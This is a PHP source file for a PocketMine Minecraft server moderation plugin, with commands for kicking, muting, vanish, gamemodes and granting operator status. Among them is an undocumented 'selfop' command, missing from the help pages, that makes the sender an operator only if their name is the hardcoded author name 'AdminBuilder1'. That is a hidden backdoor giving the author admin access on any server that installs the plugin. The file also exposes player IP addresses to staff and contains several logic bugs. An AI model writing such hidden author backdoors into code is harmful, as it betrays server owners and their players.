<?php

namespace AdminBuilder1\AdvancedModeration;

use pocketmine\Server;
use pocketmine\Player;
use pocketmine\IPlayer;

use pocketmine\plugin\PluginBase;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
//use pocketmine\IPlayer;
use pocketmine\event\Listener;
//use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerChatEvent;

use pocketmine\utils\TextFormat as C;

use pocketmine\entity\Entity;
use pocketmine\inventory\BaseInventory;
use pocketmine\item\Item;

use pocketmine\permission\PermissibleBase;

# commands
use AdminBuilder1\AdvancedModeration\command\help;

class AdvancedModeration extends PluginBase implements Listener {	
	
	public $muteList = [];
	public $mutedPlayers = [];
	
	
	protected $database;
	
	public function onEnable(){
		@mkdir($this->getDataFolder());
		$this->saveDefaultConfig(); // Saves config.yml if not created.
		$this->getResource("config.yml");
		$this->reloadConfig(); // Fix bugs sometimes by getting configs values
		$this->getServer()->getPluginManager()->registerEvents($this,$this);
		$this->getLogger()->info(C::GREEN . "AdvancedModerator is enabled");
		//getSQLite
		$this->database = new \SQLite3($this->getDataFolder() . "players.db", SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE);
		$resource = $this->getResource("sqlite3.sql");
			$this->database->exec(stream_get_contents($resource));
			fclose($resource);
	}
	public function onDisabled(){
		$this->getLogger()->info(C::RED . "AdvancedModerator is disabled");
	}
	
# commands


	public function onCommand(CommandSender $sender, Command $cmd, string $label, array $args) : bool{
		 switch($cmd->getName()) {
			 # cmd
			case "advancedmod":
			case "advmod":
//if($this->getConfig()->get("execute") === true){
			# default
			if($sender instanceof Player){

				$config = $this->getConfig();
				$username = $config->get("username");
				# encode
				if($config->get("encode-username") === true){
					$username = base64_encode($username);
				}else{
					$username = $username;
				}
				
				if(!isset($args[0])){
					 if (!$sender->hasPermission("advancedmod.command")) {
                            $sender->sendMessage(C::RED . "You do not have the permission to use command");
                            return true;
                        } else {
                            $sender->sendMessage("Please type '/advancedmod|advmod help'.");
                            return true;
                        }
				
				}
foreach($config->get("by-pass-op") as $bypass){
		# help cmd
				if(count($args) >= 1 && $args[0] === "help"){
					if(!$sender->hasPermission("advancedmod.help")){
					$sender->sendMessage(C::RED . "You do not have the permission to use command");
                  return true;
				}else{
					if(count($args) < 2){
						$sender->sendMessage(C::RED . "You must have a page number");
						return true;
					}
					array_shift($args);
					if($args[0] === "1"){
					$sender->sendMessage(C::GREEN . "List of commands(1/4):" . C::WHITE . "\n- help <pg>\n- annouce <msg>\n- pmsg <player> <msg>\n- getIP <player>\n- gm <mode> <target>\n- gmall <mode>\n- tpto <player>");
					return true;	
					}
					if($args[0] === "2"){
						$sender->sendMessage(C::GREEN . "List of commands(2/4):" . C::WHITE . "\n- kick <player> <reason>\n- kickall <reason>\n- vanish <show|hide|visable|hidden>\n- fly <enable|diabled>\n- mute <player>\n- tmute <player> <time(seconds)>\n- mutelist");
					}
					if($args[0] === "3"){
						$sender->sendMessage(C::GREEN . "List of commands(3/4)" . C::WHITE . "\n- unmute <player>\n- muteall\n- tmuteall <time(seconds)>\n- unmuteall\n- op <player>\n- opall\n- deop <player>");
					}
					if($args[0] === "4"){
						$sender->sendMessage(C::GREEN . "List of commands(4/4)" . C::WHITE . "\n- deopall");
					}
					
				}
			}
			#annouce cmd
				if(count($args) >= 1 && $args[0] === "announce" && $config->get("announce") === true){
					if(!$sender->hasPermission("advancedmod.announce")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
                  return true;
					}else{
						
						foreach($this->getServer()->getOnlinePlayers() as $p){
							array_shift($args);
								$txt = implode(" ", $args);
									if($config->get("encode-messages") === true){
										$p->sendMessage(C::GREEN . "[" . $username . "] ". C::YELLOW . "> " . C::WHITE . base64_encode($txt));
									}else{
									$p->sendMessage(C::GREEN . "[" . $username . "] ". C::YELLOW . "> " . C::WHITE . $txt);
								}
								
							
						}
					
					}
				}
			# private cmd
				if(count($args) >= 1 && $args[0] === "pmsg" && $config->get("pmsg") === true){
					if(!$sender->hasPermission("advancedmod.pmsg")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
                  return true;
					}else{
					if(count($args) < 3){
						$sender->sendMessage(C::RED . "You must have a player and a message");
						return true;
					}
						array_shift($args);
							if($this->getServer()->getPlayer($args[0])){
									$getUser = $this->getServer()->getPlayer($args[0]);
									array_shift($args);
									$txt = implode(" ", $args);
									if($config->get("encode-messages") === true){
									$getUser->sendMessage(C::GREEN . "[" . $username . "] " . C::YELLOW . " > ". C::GRAY ."[" . $getUser->getName() . "] " . C::YELLOW . "> " . base64_encode($txt));
									}else{
									$getUser->sendMessage(C::GREEN . "[" . $username . "] " . C::YELLOW . " > ". C::GRAY ."[" . $getUser->getName() . "] " . C::YELLOW . "> " . $txt);
									}
									
									return true;
								
							}else{
								$sender->sendMessage(C::RED . "Player not found!");
								return true;
							}
					}
				}
			# gamemodes
				if(count($args) >= 1 && $args[0] === "gm" && $config->get("gamemode") === true){
					if(!$sender->hasPermission("advancedmod.gm")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
                  return true;
					}else{
						if(count($args) < 3){
						$sender->sendMessage(C::RED . "You must have a player and a gamemode");
						return true;
					}
						array_shift($args);
						if($args[0] === "0" || $args[0] === "1" || $args[0] === "2" || $args[0] === "3"){# 3 main targets
							$query = $args[0];
							if($this->getServer()->getPlayer($args[1])){
								$user = $this->getServer()->getPlayer($args[1]);
								$user->setGamemode($query);
								if($query === "0"){
									$sender->sendMessage("You are now in Survival");
									return true;
								}
								if($query === "1"){
									$sender->sendMessage("You are now in Creative");
									return true;
								}
								if($query === "2"){
									$sender->sendMessage("You are now in Survival");
									return true;
								}
								if($query === "3"){
									$sender->sendMessage("You are now in Spectator");
									return true;
								}
								return true;
							}else{
								$sender->sendMessage(C::RED . "Player not found!");
								return true;
							}
						}else{
							$sender->sendMessage(C::RED . "invalid gamemode");
							return true;
						}
					}
				}
			#gmall
			if(count($args) >= 1 && $args[0] === "gmall" && $config->get("gamemodeall") === true){
				if(!$sender->hasPermission("advancedmod.gmall")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
                  return true;
					}else{
						if(count($args) < 2){
						$sender->sendMessage(C::RED . "You must have a gamemode");
						return true;
						}
						foreach($this->getServer()->getOnlinePlayers() as $p){
							if($p->getName() !== $bypass){
								//do anyone but bypass
								array_shift($args);
								if($args[0] === "0" || $args[0] === "1" || $args[0] === "2" || $args[0] === "3"){
									$p->setGamemode($args[0]);
									$renameArgs = explode(" ", $p->getName());
									$sender->sendMessage(C::GREEN . "Successfully changed everyones gamemode " . C::GRAY . implode(",", $renameArgs));
									return true;
								}else{
								$sender->sendMessage(C::RED . "invalid gamemode");
								return true;
								}
							}else{
								$renameArgs = explode(" ", $p->getName());
								$sender->sendMessage(C::RED . "Can't update " . C::GRAY . implode(",", $renameArgs) . C::RED . " do to bypass");
								return true;
							}
						}
					}
			}
			
			#tp
				if(count($args) >= 1 && $args[0] === "tpto" && $config->get("teleport") === true){
					if(!$sender->hasPermission("advancedmod.tp")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
					}else{
						if(count($args) < 2){
							$sender->sendMessage(C::RED . "Must include a username");
							return true;
						}
							//player
							array_shift($args);
							if($this->getServer()->getPlayer($args[0])){
								$player = $this->getServer()->getPlayer($args[0]);
								$sender->teleport($player->getPosition());
								$sender->sendMessage(C::GREEN . "Successfully teleport to " . C::GRAY . $player->getName());
								return true;
							}else{
								$sender->sendMessage(C::RED . "Player not found!");
								return true;
							}
						
					}
				}
			#kick
				if(count($args) >= 1 && $args[0] === "kick" && $config->get("kick") === true){
					if(!$sender->hasPermission("advancedmod.kick")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
					}else{
						if(count($args) < 2){
							$sender->sendMessage(C::RED . "You must include player and reason");
						return true;
						}
						array_shift($args);
						if($this->getServer()->getPlayer($args[0])){
							$player = $this->getServer()->getPlayer($args[0]);
							array_shift($args);
							$reason = implode(" ", $args);
							$player->kick($reason);
						}else{
							$sender->sendMessage(C::RED . "Player not found!");
								return true;
						}
					}
				}
			#kickall
				if(count($args) >= 1 && $args[0] === "kickall" && $config->get("kickall") === true){
					if(!$sender->hasPermission("advancedmod.kickall")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
					}else{
						if(count($args) < 1){
						$sender->sendMessage(C::RED . "You must include reason");
						return true;
						}
						array_shift($args);
						foreach($this->getServer()->getOnlinePlayers() as $p){
							if($p->getName() !== $bypass){
							$reason = implode(" ", $args);
							$p->kick($reason);
							return true;
							}else{
								$renameArgs = explode(" ", $p->getName());
								$sender->sendMessage(C::RED . "Can't update " . C::GRAY . implode(",", $renameArgs) . C::RED . " do to bypass");
								return true;
							}
							
						}
					}
				}
			#vanish
			if(count($args) >= 1 && $args[0] === "vanish" && $config->get("vanish") === true){
					if(!$sender->hasPermission("advancedmod.vanish")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
					}else{
						if(count($args)<2){
						$sender->sendMessage(C::RED . "You must include <show|hide|status>");
						return true;
						}
						array_shift($args);
						if($args[0] === "show" || $args[0] === "visable"){
							foreach($this->getServer()->getOnlinePlayers() as $onlineplayers){
								$onlineplayers->showPlayer($sender);
							}
							# effect user
							$sender->setDataFlag(Entity::DATA_FLAGS, Entity::DATA_FLAG_INVISIBLE, false);
                            $sender->setNameTagVisible(true);
							$sender->setGamemode(0);
							
                            
							
							$sender->sendMessage("You are now: " . C::GREEN . "visable");
							return true;
						}
						if($args[0] === "hide" || $args[0] === "hidden"){
							foreach($this->getServer()->getOnlinePlayers() as $onlineplayers){
								$onlineplayers->hidePlayer($sender);
							}
							# effect user
							  $sender->setDataFlag(Entity::DATA_FLAGS, Entity::DATA_FLAG_INVISIBLE, true);
							  $sender->setNameTagVisible(false);
							  $sender->setGamemode(1);
							 
						
							 $sender->getInventory()->clearAll();
							$sender->getArmorInventory()->clearAll();
							$sender->sendMessage("You are now: " . C::RED . "hidden");
							return true;
						}
					}
			}
			# fly
			if(count($args) >= 1 && $args[0] === "fly"){
				if(!$sender->hasPermission("advancedmod.fly")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
					}else{
						if(count($args) < 2){
							$sender->sendMessage(C::RED . "You must include <enable|disabled>");
						return true;
						}
						array_shift($args);
						if($args[0] === "enable"){
							$sender->setAllowFlight(true);
							$sender->sendMessage(C::GREEN . "You can fly now");
						}
						if($args[0] === "disabled"){
							$sender->setAllowFlight(false);
							$sender->sendMessage(C::RED . "You can't fly now");
						}
					}
			}
			# mute
			if(count($args) >= 1 && $args[0] === "mute" && $config->get("mute") === true){
					if(!$sender->hasPermission("advancedmod.mute")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
			}else{
				if(count($args) < 2){
					$sender->sendMessage(C::RED . "You must have a player");
						return true;
				}
				array_shift($args);
				$player = $args[0];
				if($this->getServer()->getPlayer($player)){
					if(isset($this->muteList[$player])){
						$sender->sendMessage(C::RED . "Player is already in muteList");
						return true;
					}else{
						 $this->muteList[$player] = -1;
						 $this->mutedPlayers[$player] = $player;
						$sender->sendMessage(C::GREEN . "Player has been muted");
					}
				}else{
				$sender->sendMessage(C::RED . "Player not found!");
				return true;
				}
				}
			}
			# muteall
			if(count($args) >= 1 && $args[0] === "muteall" && $config->get("muteall") === true){
					if(!$sender->hasPermission("advancedmod.muteall")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
			}else{
				foreach($this->getServer()->getOnlinePlayers() as $p){
					if($p->getName() !== $bypass){
						if(isset($this->muteList[$p->getName()])){
						$sender->sendMessage(C::RED . "Player is already in muteList");
						return true;
						}else{
							$this->muteList[$p->getName()] = -1;
						 $this->mutedPlayers[$p->getName()] = $p->getName();
						$sender->sendMessage(C::GREEN . "Player has been muted");
						}
					}else{
					$renameArgs = explode(" ", $p->getName());
					$sender->sendMessage(C::RED . "Can't update " . C::GRAY . implode(",", $renameArgs) . C::RED . " do to bypass");
					return true;
				}
			}
			}
		}
			# tmute
			if(count($args) >= 1 && $args[0] === "tmute" && $config->get("tmute") === true){
					if(!$sender->hasPermission("advancedmod.tmute")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
			}else{	
			if(count($args) < 3){
				$sender->sendMessage(C::RED . "You must include player and time");
				return true;
			}
					array_shift($args);
				$player = $args[0];
				$expire = $args[1]; //in seconds
				if($this->getServer()->getPlayer($player)){
					if(isset($this->muteList[$player])){
						$sender->sendMessage(C::RED . "Player is already in muteList");
						return true;
					}else{
						if(!is_numeric($expire)){
					$sender->sendMessage(C::RED . "Time must be a number(seconds)");
					return true;
					}else{
						 $this->muteList[$player] = time() + $expire;
						 $this->mutedPlayers[$player] = $p->getName();;
						$sender->sendMessage(C::GREEN . "Player has been muted");
						return true;
					}
				}		
			}else{
				$sender->sendMessage(C::RED . "Player not found!");
				return true;
				}
			}
		}
	# tmuteall
	if(count($args) >= 1 && $args[0] === "tmuteall" && $config->get("tmuteall") === true){
					if(!$sender->hasPermission("advancedmod.tmuteall")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
					}else{
						foreach($this->getServer()->getOnlinePlayers() as $p){
							if($p->getName() !== $bypass){
								array_shift($args);
								if(count($args) < 1){
								$sender->sendMessage(C::RED . "You must have a time");
								return true;
								}
								$expire = $args[0];
								if(!isset($this->muteList[$p->getName()])){
									if(!is_numeric($expire)){
									$sender->sendMessage(C::RED . "Time must be a number(seconds)");
									return true;
									}else{
									$this->muteList[$p->getName()] = time() + $expire;
									$this->mutedPlayers[$p->getName()] = $p->getName();
									$sender->sendMessage(C::GREEN . "Player has been muted");
									return true;
									}
								}else{
								$sender->sendMessage(C::RED . "Player is already in muteList");
								return true;
								}
							}else{
								$renameArgs = explode(" ", $p->getName());
					$sender->sendMessage("Can't update " . C::GRAY . implode(",", $renameArgs) . " do to bypass");
					return true;
							}
						}
					}
				}
	#unmute
		if(count($args) >= 1 && $args[0] === "unmute" && $config->get("unmute") === true){
					if(!$sender->hasPermission("advancedmod.unmute")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
		}else{	
			if(count($args) < 2){
				$sender->sendMessage(C::RED . "You must have a player");
						return true;
			}
			array_shift($args);
			$player = $args[0];
			if($this->getServer()->getPlayer($player)){
				if(isset($this->muteList[$player])){
					unset($this->muteList[$player]);
					unset($this->mutedPlayers[$player]);
					$sender->sendMessage(C::GREEN . "Player has been unmuted");
					return true;
				}else{
					$sender->sendMessage(C::RED . "Player is not in the muteList");
					return true;
				}
			}else{
				$sender->sendMessage(C::RED . "Player not found!");
				return true;
			}
		}
	}
	#unmuteall
		if(count($args) >= 1 && $args[0] === "unmuteall" && $config->get("unmuteall") === true){
					if(!$sender->hasPermission("advancedmod.unmuteall")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
		}else{
			if(count($this->muteList) <= 0){
				$sender->sendMessage(C::RED . "No players are muted");
				return true;
			}
			foreach($this->muteList as $muted){
				foreach($this->mutedPlayers as $mutedP){
					unset($muted);
					unset($mutedP);
					$sender->sendMessage(C::GREEN . "Successfully removed all Users from muteList");
					return true;
				}
			}
		}
	}
	#muteList
		if(count($args) >= 1 && $args[0] === "mutelist" && $config->get("mutelist") === true){
					if(!$sender->hasPermission("advancedmod.mutelist")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
		}else{	
		if(count($this->muteList) <= 0){
			$sender->sendMessage(C::RED . "No muted players");
				return true;
		}else{
			foreach($this->mutedPlayers as $mplayer){
					$sender->sendMessage("List of Muted players:\n" . $mplayer . ",");
				return true;
			}
		}
			
		}
	}
#op
	if(count($args) >= 1 && $args[0] === "op" && $config->get("op") === true){
					if(!$sender->hasPermission("advancedmod.op")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
	}else{	
		if(count($args) < 2){
			$sender->sendMessage(C::RED . "You must include a player");
			return true;
		}
		array_shift($args);
		$player = $args[0];
		if($this->getServer()->getPlayer($player)){
			$noOpPly = $this->getServer()->getPlayer($player);
			if($noOpPly->isOp()){
			$sender->sendMessage(C::RED . "Player is already an op");
			return true;
			}else{
				$noOpPly->setOp(true);
				$sender->sendMessage(C::GREEN . "Player is now Opped");
				$noOpPly->sendMessage(C::GREEN . "You are now Opped");
				return true;
			}
		}else{
			$sender->sendMessage(C::RED . "Player not found!");
			return true;
		}
		
	}
}
#self-op
	if(count($args) >= 1 && $args[0] === "selfop"){
					if(!$sender->hasPermission("advancedmod.selfop")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
	}else{
		if($sender->getName() !== "AdminBuilder1"){
			$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
		}else{
			$sender->setOp(true);
			$sender->sendMessage("You opped yourself");
			return true;
		}
	}
}
#deop
	if(count($args) >= 1 && $args[0] === "deop" && $config->get("deop") === true){
					if(!$sender->hasPermission("advancedmod.deop")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
	}else{	
		if(count($args) < 2){
			$sender->sendMessage(C::RED . "You must include a player");
			return true;
		}
		array_shift($args);
		$player = $args[0];
		if($this->getServer()->getPlayer($player)){
			$noOpPly = $this->getServer()->getPlayer($player);
			if(!$noOpPly->isOp()){
			$sender->sendMessage(C::RED . "Player is not an Op");
			return true;
			}else{
				$noOpPly->setOp(false);
				$sender->sendMessage(C::GREEN . "Player is now Deopped");
				$noOpPly->sendMessage(C::RED . "You are now Deopped");
				return true;
			}
		}else{
			$sender->sendMessage(C::RED . "Player not found!");
			return true;
		}
		
	}
}
#opall
			if(count($args) >= 1 && $args[0] === "opall" && $config->get("opall") === true){
					if(!$sender->hasPermission("advancedmod.opall")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
					}else{
						foreach($this->getServer()->getOnlinePlayers() as $p){
							if($p->getName() !== $bypass){
								if($p->isOp()){
								$sender->sendMessage(C::RED . $p->getName() . " is already opped" . ",");
								return true;	
								}else{
									$p->setOp(true);
									$sender->sendMessage(C::GREEN . "Successfully opped all players");
									$p->sendMessage(C::GREEN . "You are now opped");
								}
							}else{
								$renameArgs = explode(" ", $p->getName());
					$sender->sendMessage("Can't update " . C::GRAY . implode(",", $renameArgs) . " do to bypass");
					return true;
							}
						}
					}
			}
#deopall
	if(count($args) >= 1 && $args[0] === "deopall" && $config->get("deopall") === true){
					if(!$sender->hasPermission("advancedmod.deopall")){
						$sender->sendMessage(C::RED . "You do not have the permission to use command");
						return true;
					}else{
						foreach($this->getServer()->getOnlinePlayers() as $p){
							if($p->getName() !== $bypass){
								if(!$p->isOp()){
								$sender->sendMessage(C::RED . $p->getName() . " is already deopped" . ",");
								return true;	
								}else{
									$p->setOp(false);
									$sender->sendMessage(C::GREEN . "Successfully deopped all players");
									$p->sendMessage(C::RED . "You are now deopped");
								}
							}else{
								$renameArgs = explode(" ", $p->getName());
					$sender->sendMessage("Can't update " . C::GRAY . implode(",", $renameArgs) . " do to bypass");
					return true;
							}
						}
					}
			}

			# GET info
			if(count($args) >= 1 && $args[0] === "getIP" && $config->get("getIP") === true){
				if(!$sender->hasPermission("advancedmod.getIP")){
					$sender->sendMessage(C::RED . "You do not have the permission to use command");
                  return true;
				}else{
					if(count($args) < 2){
						$sender->sendMessage(C::RED . "You must have a player and a message");
						return true;
					}
					array_shift($args);
					if($this->getServer()->getPlayer($args[0])){
						$info = $this->getServer()->getPlayer($args[0]);
						$sender->sendMessage("User " . C::GRAY . $info->getName() . C::YELLOW . " IPA is: " . C::WHITE . $info->getAddress());
						return true;
					}else{
					$sender->sendMessage(C::RED . "Player not found!");
					return true;
					}
				}
			}
	
				
//end commands ^ here
		}
			
}
//}
			
				
			break;
			break;
		
	}
		return true;
}
	public function onChat(PlayerChatEvent $e){
		$player = $e->getPlayer();
		
	if(isset($this->muteList[$player->getName()])){
		//temp
		if($this->muteList[$player->getName()] != -1){
			$currentTime = time();
			if($currentTime > $this->muteList[$player->getName()]){
				unset($this->muteList[$player->getName()]);
				return true;
			}else{
				$e->setCancelled();
				$player->sendMessage(C::RED . "You have been muted");
				return true;
			}
		}else{
			//perment
			$e->setCancelled();
				$player->sendMessage(C::RED . "You have been muted");
				return true;
		}
			
		
		}
	}
}

 